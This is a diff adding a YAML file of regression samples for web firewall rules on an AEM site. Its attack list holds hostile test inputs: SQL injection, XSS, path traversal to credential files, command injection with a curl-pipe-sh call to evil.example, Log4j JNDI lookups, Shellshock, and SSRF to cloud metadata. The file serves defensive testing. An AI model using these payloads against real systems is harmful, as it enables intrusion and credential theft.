@@ -1,0 +1,106 @@
+# Regression samples. Add every false positive you find in production to `legit`,
+# and every attack you want guaranteed coverage for to `attack` (optional `expect`).
+attack:
+  - {name: sqlmap UA, url: "/content/site/en.html", headers: {User-Agent: "sqlmap/1.8.3#stable (https://sqlmap.org)"}, expect: crs-913-scanner-user-agents}
+  - {name: nuclei UA, url: "/", headers: {User-Agent: "Mozilla/5.0 Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}, expect: crs-913-scanner-user-agents}
+  - {name: traversal encoded, url: "/content/site/en.html?file=..%2f..%2f..%2fetc%2fpasswd", expect: crs-930-path-traversal}
+  - {name: traversal plain, url: "/content/../../etc/passwd", expect: crs-930-path-traversal}
+  - {name: git config, url: "/.git/config", expect: crs-930-restricted-files}
+  - {name: dotenv, url: "/.env", expect: crs-930-restricted-files}
+  - {name: aws creds, url: "/.aws/credentials", expect: crs-930-restricted-files}
+  - {name: lfi in arg, url: "/content/site/en.html?page=/etc/shadow", expect: crs-930-lfi-os-files}
+  - {name: sqli union, url: "/content/site/en/search.html?q=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", expect: crs-942-sqli}
+  - {name: sqli plus encoded, url: "/content/site/en/search.html?id=1+union+all+select+null,null--", expect: crs-942-sqli}
+  - {name: sqli sleep, url: "/search?id=1%20AND%20SLEEP(5)", expect: crs-942-sqli}
+  - {name: sqli tautology, url: "/search?user=admin%27%20or%20%271%27=%271", expect: crs-942-sqli}
+  - {name: xss script, url: "/content/site/en/search.html?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", expect: crs-941-xss}
+  - {name: xss svg onload, url: "/search?q=%3Csvg/onload=alert(1)%3E", expect: crs-941-xss}
+  - {name: xss javascript uri, url: "/search?next=javascript:alert(1)", expect: crs-941-xss}
+  - {name: rce unix, url: "/search?ip=127.0.0.1;cat%20/etc/passwd"}
+  - {name: rce subshell, url: "/search?x=$(curl%20http://evil.example/x.sh|sh)"}
+  - {name: shellshock UA, url: "/", headers: {User-Agent: "() { :; }; /bin/bash -c 'id'"}}
+  - {name: log4j url, url: "/?x=$%7Bjndi:ldap://evil.example/a%7D", expect: crs-944-java-attack}
+  - {name: log4j UA, url: "/", headers: {User-Agent: "${jndi:ldap://evil.example/a}"}, expect: aem-block-log4j-headers}
+  - {name: java gadget, url: "/bin/x?cls=java.lang.Runtime", expect: crs-944-java-classes}
+  - {name: rfi, url: "/x.html?include=http://203.0.113.9/shell.txt?"}
+  - {name: ssrf metadata, url: "/proxy?url=http://169.254.169.254/latest/meta-data/", expect: crs-934-ssrf}
+  - {name: crlf split, url: "/x?r=%0d%0aSet-Cookie:%20a=b", expect: crs-921-protocol-attack}
+  - {name: wp probe, url: "/wp-login.php", expect: aem-block-foreign-tech-probes}
+  - {name: php probe, url: "/index.php?s=/index/think", expect: aem-block-foreign-tech-probes}
+  - {name: querybuilder, url: "/bin/querybuilder.json?path=/home&p.limit=-1", expect: aem-block-sensitive-paths-publish}
+  - {name: infinity json, url: "/content/site.infinity.json", expect: aem-block-sensitive-paths-publish}
+  - {name: felix console, url: "/system/console/bundles", expect: aem-block-sensitive-paths-publish}
+  - {name: null byte, url: "/content/site/en.html%00.json", expect: aem-block-null-byte}
+  - {name: oob callback, url: "/x?u=http://abc123.oast.fun", expect: aem-block-oob-callback-domains}
+  - {name: fake googlebot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, expect: bots-fake-google}
+  - {name: fake bingbot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0 Safari/537.36"}, expect: bots-fake-bing}
+  - {name: fake gptbot, url: "/content/site/en.html", ip: "198.51.100.7", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; GPTBot/1.1; +https://openai.com/gptbot"}, expect: bots-fake-openai}
+  - {name: AI training crawler CCBot, url: "/content/site/en.html", headers: {User-Agent: "CCBot/2.0 (https://commoncrawl.org/faq/)"}, expect: bots-ai-block}
+  - {name: AI training Bytespider, url: "/", headers: {User-Agent: "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; spider-feedback@bytedance.com)"}, expect: bots-ai-block}
+  - {name: AI training ClaudeBot, url: "/", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ClaudeBot/1.0; +claudebot@anthropic.com)"}, expect: bots-ai-block}
+  - {name: python scraper, url: "/content/site/en.html", headers: {User-Agent: "python-requests/2.32.3"}, expect: bots-http-libraries}
+  - {name: unknown crawler, url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 (compatible; RandomSpider/3.1)"}, expect: bots-generic-crawler-ratelimit}
+  - {name: signed AI agent, url: "/content/site/en.html", headers: {Signature-Agent: '"https://chatgpt.com"'}, expect: bots-signed-agents}
+  - {name: no UA, url: "/content/site/en.html", headers: {User-Agent: null}, expect: aem-no-user-agent}
+
+legit:
+  - {url: "/"}
+  - {url: "/content/site/en.html"}
+  - {url: "/content/site/en/products/release-2.0.html"}
+  - {url: "/content/site/en/about-us/environment-and-sustainability.html"}
+  - {url: "/content/site/en/blog/how-to-select-the-right-gift-from-our-shop.html"}
+  - {url: "/content/site/en/search.html?q=union+jobs+in+zagreb"}
+  - {url: "/content/site/en/search.html?q=o%27reilly+books"}
+  - {url: "/content/site/en/search.html?q=select+a+gift+from+our+shop"}
+  - {url: "/content/site/en/search.html?q=%C5%A1to+je+novo&lang=hr"}
+  - {url: "/content/site/en/search.html?q=c%23+and+.net+developer"}
+  - {url: "/content/site/en/search.html?q=1%2B1%3D2"}
+  - {url: "/content/site/en/search.html?q=script+writing+course"}
+  - {url: "/content/site/en/search.html?q=dark+mode+%26+settings"}
+  - {url: "/content/site/en/page.model.json"}
+  - {url: "/content/site/en/jcr:content/root/container/teaser.model.json"}
+  - {url: "/content/site/en/news.html?page=2&sort=date&order=desc"}
+  - {url: "/content/site/en/contact.html?utm_source=newsletter&utm_medium=email&utm_campaign=nov-2026&gclid=Cj0KCQiA_example"}
+  - {url: "/content/site/en/contact.html?fbclid=IwAR2_example&ref=https%3A%2F%2Fwww.google.com%2F"}
+  - {url: "/content/site/en/login.html?resource=%2Fcontent%2Fsite%2Fen%2Fmember.html"}
+  - {url: "/content/dam/site/brochure.pdf"}
+  - {url: "/content/dam/site/downloads/press-kit.zip"}
+  - {url: "/content/dam/site/images/hero.jpg/_jcr_content/renditions/cq5dam.web.1280.1280.jpeg"}
+  - {url: "/content/dam/site/images/hero.coreimg.85.1600.jpeg/1699999999999/hero.jpeg"}
+  - {url: "/etc.clientlibs/site/clientlibs/clientlib-site.lc-abc123-lc.min.css"}
+  - {url: "/etc.clientlibs/site/clientlibs/clientlib-site.lc-abc123-lc.min.js"}
+  - {url: "/etc.clientlibs/core/wcm/components/commons/datalayer/v2/clientlibs/core.wcm.components.commons.datalayer.v2.lc-1e0136bad0acfb78be509234578e44f9-lc.min.js"}
+  - {url: "/libs/granite/csrf/token.json"}
+  - {url: "/graphql/execute.json/site/articles-by-tag;tag=news"}
+  - {url: "/content/experience-fragments/site/en/site/header/master.html"}
+  - {url: "/content/site/en/sitemap.xml"}
+  - {url: "/robots.txt"}
+  - {url: "/favicon.ico"}
+  - {url: "/.well-known/security.txt"}
+  - {url: "/.well-known/apple-app-site-association"}
+  - {url: "/content/site/en/careers.html?location=Zagreb&department=IT%2FEngineering"}
+  - {url: "/content/site/en/products.html?filter=price%3E100&filter=color:red"}
+  - {url: "/content/site/en/shop/cart.html?item=SKU-123&qty=2&coupon=WINTER-20"}
+  - {url: "/content/site/en/api/products.json?category=shoes&size=42"}
+  - {url: "/content/site/en/events.html?from=2026-11-01&to=2026-11-30"}
+  - {url: "/content/site/en/docs/linux-commands-cheatsheet.html"}
+  - {url: "/content/site/en/search.html?q=how+to+use+cat+and+grep"}
+  - {url: "/content/site/en/search.html?q=java+lang+tutorial"}
+  - {url: "/content/site/en/search.html?q=what+is+an+.env+file"}
+  - {url: "/content/site/en/search.html?q=sleep+tips+for+parents"}
+  - {url: "/content/site/en/search.html?q=%22exact+phrase%22"}
+  - {url: "/content/site/en/redirect.html?target=https://www.partner.example/offer"}
+  # 66.249.66.1 = Google's own documented Googlebot example address
+  - {name: real googlebot, url: "/content/site/en.html", ip: "66.249.66.1", headers: {User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
+  # AI-policy samples: test category policy only, not IP verification (`ignore`)
+  - {name: ChatGPT-User (AI assistant), ignore: [bots-fake-openai], url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot"}}
+  - {name: OAI-SearchBot (AI search), ignore: [bots-fake-openai], url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; OAI-SearchBot/1.0; +https://openai.com/searchbot"}}
+  - {name: Perplexity-User, ignore: [bots-fake-perplexity], url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Perplexity-User/1.0; +https://perplexity.ai/perplexity-user)"}}
+  - {name: LinkedIn preview, url: "/content/site/en.html", headers: {User-Agent: "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)"}}
+  - {name: Facebook preview, url: "/content/site/en.html", headers: {User-Agent: "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"}}
+  - {name: Slack unfurl, url: "/content/site/en.html", headers: {User-Agent: "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"}}
+  - {name: iPhone Safari, url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"}}
+  - {name: Chrome Windows, url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}}
+  - {name: Edge, url: "/content/site/en.html", headers: {User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"}}
+  - {name: curl monitor, url: "/content/site/en.html", headers: {User-Agent: "curl/8.7.1"}}
+  - {name: form post, url: "/content/site/en/contact.html", method: POST, headers: {Content-Type: "application/x-www-form-urlencoded"}}
